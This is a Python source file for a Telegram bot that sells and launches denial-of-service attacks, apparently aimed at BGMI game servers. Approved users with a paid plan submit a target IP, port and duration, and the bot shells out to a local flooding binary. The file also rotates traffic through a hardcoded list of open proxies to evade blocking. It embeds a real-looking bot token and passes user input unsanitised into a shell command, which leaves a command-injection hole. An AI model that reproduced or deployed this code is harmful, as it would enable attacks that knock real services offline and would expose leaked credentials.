import os
import json
import telebot
import logging
import time
import asyncio
import random
import requests
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Constants
TOKEN = '7143705387:AAHAQbDfttfOl_kkbX4-qDgWNMScTTrif28'  # Replace with your actual bot token
REQUEST_INTERVAL = 1
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
ADMIN_ROLE = 'admin'
USER_ROLE = 'user'
ADMINS_FILE = 'admins.json'
USERS_FILE = 'users.txt'

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# In-memory storage for user data and admins
user_data = {}
admins = set()

def load_admins():
    """Load admin user IDs from a JSON file."""
    global admins
    if os.path.exists(ADMINS_FILE):
        try:
            with open(ADMINS_FILE, 'r') as file:
                data = json.load(file)
                if isinstance(data, list) and all(isinstance(i, int) for i in data):
                    admins = set(data)
                else:
                    logging.error(f"Invalid format in {ADMINS_FILE}. Expected a list of integers.")
                    admins = set()  # Reset admins if format is incorrect
        except json.JSONDecodeError as e:
            logging.error(f"JSON decode error while loading admins: {e}")
            admins = set()  # Reset admins on JSON error
        except Exception as e:
            logging.error(f"Unexpected error while loading admins: {e}")
            admins = set()  # Reset admins on unexpected error
    else:
        admins = set()  # Initialize with an empty set if file does not exist

def save_admins():
    """Save admin user IDs to a JSON file."""
    with open(ADMINS_FILE, 'w') as file:
        json.dump(list(admins), file)

def add_admin(user_id):
    """Add a user as an admin and save to persistent storage."""
    admins.add(user_id)
    save_admins()

def load_users():
    """Load user data from a text file."""
    global user_data
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, 'r') as file:
                for line in file:
                    parts = line.strip().split()
                    if len(parts) == 2:
                        user_id = int(parts[0])
                        role = parts[1]
                        if role in [ADMIN_ROLE, USER_ROLE]:
                            user_data[user_id] = {'role': role}
        except Exception as e:
            logging.error(f"Error loading users from file: {e}")

def save_users():
    """Save user data to a text file."""
    with open(USERS_FILE, 'w') as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id} {data['role']}\n")

def register_user(user_id, role):
    """Register a user with a specific role and save to file."""
    user_data[user_id] = {'role': role}
    save_users()  # Save to users file

def is_user_authorized(user_id, required_role):
    """Check if the user is authorized based on their role."""
    user = user_data.get(user_id)
    if user:
        return user.get('role') == required_role
    return False

def is_admin(user_id):
    """Check if the user is an admin."""
    return user_id in admins

def validate_bot_token():
    try:
        response = requests.get(f"https://api.telegram.org/bot{TOKEN}/getMe")
        if response.status_code == 200:
            logging.info("Bot token is valid.")
        else:
            logging.error(f"Invalid bot token. Response code: {response.status_code}")
    except Exception as e:
        logging.error(f"Error validating bot token: {e}")

validate_bot_token()

def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678", 
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631", 
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445", 
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928", 
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128", 
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080", 
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800", 
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678", 
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820", 
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080", 
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016", 
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542", 
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153", 
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145", 
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145", 
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145", 
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137", 
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128", 
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678", 
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145", 
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080", 
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145", 
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145", 
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.187.108.6:4153", 
        "https://45.189.112.70:1080", "https://82.118.243.77:31113", "https://103.6.150.97:4153", 
        "https://182.253.159.171:5678", "https://103.88.228.2:4145", "https://103.211.50.89:1080", 
        "https://185.228.73.232:1080", "https://114.124.158.229:4145", "https://185.196.44.78:5678", 
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    try:
        telebot.apihelper.proxy = {'https': proxy}
        logging.info(f"Proxy updated to {proxy}.")
    except Exception as e:
        logging.error(f"Failed to update proxy: {e}")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def run_attack_command_async(target_ip, target_port, duration):
    logging.info(f"Running attack command: target_ip={target_ip}, target_port={target_port}, duration={duration}")
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 900")
    await process.communicate()
    logging.info("Attack command finished.")

@bot.message_handler(commands=['register'])
def register_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if is_admin(user_id):
        try:
            cmd_parts = message.text.split()
            if len(cmd_parts) != 3:
                bot.send_message(chat_id, "*Usage: /register <user_id> <role>*", parse_mode='Markdown')
                return

            target_user_id = int(cmd_parts[1])
            role = cmd_parts[2]

            if role not in [ADMIN_ROLE, USER_ROLE]:
                bot.send_message(chat_id, "*Invalid role. Use 'admin' or 'user'.*", parse_mode='Markdown')
                return

            register_user(target_user_id, role)
            bot.send_message(chat_id, f"*User {target_user_id} registered as {role}.*", parse_mode='Markdown')
        except Exception as e:
            bot.send_message(chat_id, f"*Error: {e}*", parse_mode='Markdown')

@bot.message_handler(commands=['add_admin'])
def add_admin_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if is_admin(user_id):
        try:
            cmd_parts = message.text.split()
            if len(cmd_parts) != 2:
                bot.send_message(chat_id, "*Usage: /add_admin <user_id>*", parse_mode='Markdown')
                return

            target_user_id = int(cmd_parts[1])
            add_admin(target_user_id)
            bot.send_message(chat_id, f"*User {target_user_id} added as admin.*", parse_mode='Markdown')
        except Exception as e:
            bot.send_message(chat_id, f"*Error: {e}*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_admin(user_id):
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
        return

    target_user_id = int(cmd_parts[1])
    if cmd_parts[0] == '/approve':
        if len(cmd_parts) < 4:
            bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days>.*", parse_mode='Markdown')
            return

        try:
            plan = int(cmd_parts[2])
            days = int(cmd_parts[3])
        except ValueError:
            bot.send_message(chat_id, "*Invalid plan or days. Both must be integers.*", parse_mode='Markdown')
            return

        expiry_date = datetime.utcnow() + timedelta(days=days)
        register_user(target_user_id, plan)
        bot.send_message(chat_id, f"*User {target_user_id} approved for plan {plan} until {expiry_date}. Use /disapprove to revoke access.*", parse_mode='Markdown')

    elif cmd_parts[0] == '/disapprove':
        register_user(target_user_id, 0)
        bot.send_message(chat_id, f"*User {target_user_id} disapproved and access revoked.*", parse_mode='Markdown')

    else:
        bot.send_message(chat_id, "*Invalid command. Use /approve or /disapprove.*", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if is_admin(user_id) or is_user_authorized(user_id, USER_ROLE):
        try:
            bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
            bot.register_next_step_handler(message, process_attack_command)
        except Exception as e:
            logging.error(f"Error in attack command: {e}")
            bot.send_message(chat_id, "*Failed to process attack command. Please try again later.*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')

def process_attack_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    try:
        if not is_admin(user_id) and not is_user_authorized(user_id, USER_ROLE):
            bot.send_message(chat_id, "*You are not authorized to use this command.*", parse_mode='Markdown')
            return

        parts = message.text.split()
        if len(parts) != 3:
            bot.send_message(chat_id, "*Invalid format. Use: IP PORT DURATION.*", parse_mode='Markdown')
            return

        target_ip = parts[0]
        target_port = int(parts[1])
        duration = int(parts[2])

        if target_port in BLOCKED_PORTS:
            bot.send_message(chat_id, "*The port you entered is blocked.*", parse_mode='Markdown')
            return

        logging.info(f"Initiating attack: target_ip={target_ip}, target_port={target_port}, duration={duration}")
        asyncio.run(run_attack_command_async(target_ip, target_port, duration))
        bot.send_message(chat_id, "*Attack initiated.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error processing attack command: {e}")
        bot.send_message(chat_id, "*Failed to process attack command. Please try again later.*", parse_mode='Markdown')

if __name__ == "__main__":
    load_admins()  # Load admins from file
    load_users()  # Load users from file
    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
            time.sleep(10)  # Adding delay before retrying
